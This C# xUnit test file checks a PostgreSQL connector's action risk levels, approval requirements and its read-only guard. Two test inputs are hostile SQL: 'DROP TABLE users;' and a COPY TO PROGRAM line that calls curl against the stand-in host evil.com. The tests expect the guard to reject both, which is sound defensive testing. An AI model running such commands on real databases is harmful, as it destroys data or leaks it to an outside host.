using System.Text.Json;
using Gram.Blazor.Shared;
using Xunit;

namespace Gram.Blazor.UnitTests;

public sealed class PostgresConnectorTests
{
    private readonly PostgresDatabaseConnector _connector = new();

    [Fact]
    public void DescriptorAndActionsAreCorrectlyConfigured()
    {
        Assert.Equal("db-postgres", _connector.Descriptor.Id);
        Assert.Equal(ConnectorTransport.Native, _connector.Descriptor.Transport);
        Assert.True(_connector.Descriptor.RequiresConnection);

        var actions = _connector.Actions;
        Assert.Equal(4, actions.Count);

        var listTables = actions.FirstOrDefault(a => a.Id == "list_tables");
        Assert.NotNull(listTables);
        Assert.Equal(ActionRiskLevel.Safe, listTables!.RiskLevel);
        Assert.False(listTables.RequiresApproval);

        var inspectSchema = actions.FirstOrDefault(a => a.Id == "inspect_schema");
        Assert.NotNull(inspectSchema);
        Assert.Equal(ActionRiskLevel.Safe, inspectSchema!.RiskLevel);

        var queryReadOnly = actions.FirstOrDefault(a => a.Id == "query_readonly");
        Assert.NotNull(queryReadOnly);
        Assert.Equal(ActionRiskLevel.Safe, queryReadOnly!.RiskLevel);
        Assert.False(queryReadOnly.RequiresApproval);

        var executeDml = actions.FirstOrDefault(a => a.Id == "execute_dml");
        Assert.NotNull(executeDml);
        Assert.Equal(ActionRiskLevel.Sensitive, executeDml!.RiskLevel);
        Assert.True(executeDml.RequiresApproval);
    }

    [Fact]
    public async Task MissingConnectionStringReturnsConnectionRequired()
    {
        var parameters = JsonSerializer.SerializeToElement(new { query = "SELECT 1;" });
        var request = new ConnectorActionRequest("db-postgres", "query_readonly", parameters);

        var result = await _connector.ExecuteAsync(request);

        Assert.False(result.Success);
        Assert.Equal("connection_required", result.Status);
    }

    [Fact]
    public async Task QueryReadOnlyRejectsMutatingSqlBeforeConnecting()
    {
        var parameters = JsonSerializer.SerializeToElement(new
        {
            connectionString = "Host=localhost;Database=test;Username=postgres;Password=test;",
            query = "DROP TABLE users;"
        });
        var request = new ConnectorActionRequest("db-postgres", "query_readonly", parameters);

        var result = await _connector.ExecuteAsync(request);

        Assert.False(result.Success);
        Assert.Equal("safety_violation", result.Status);
    }

    [Fact]
    public async Task QueryReadOnlyRejectsProhibitedCommandsBeforeConnecting()
    {
        var parameters = JsonSerializer.SerializeToElement(new
        {
            connectionString = "Host=localhost;Database=test;Username=postgres;Password=test;",
            query = "COPY users TO PROGRAM 'curl evil.com';"
        });
        var request = new ConnectorActionRequest("db-postgres", "query_readonly", parameters);

        var result = await _connector.ExecuteAsync(request);

        Assert.False(result.Success);
        Assert.Equal("safety_violation", result.Status);
    }

    [Fact]
    public async Task MissingTableNameReturnsInvalidParameters()
    {
        var parameters = JsonSerializer.SerializeToElement(new
        {
            connectionString = "Host=localhost;Database=test;Username=postgres;Password=test;"
        });
        var request = new ConnectorActionRequest("db-postgres", "inspect_schema", parameters);

        var result = await _connector.ExecuteAsync(request);

        Assert.False(result.Success);
        Assert.Equal("invalid_parameters", result.Status);
    }
}
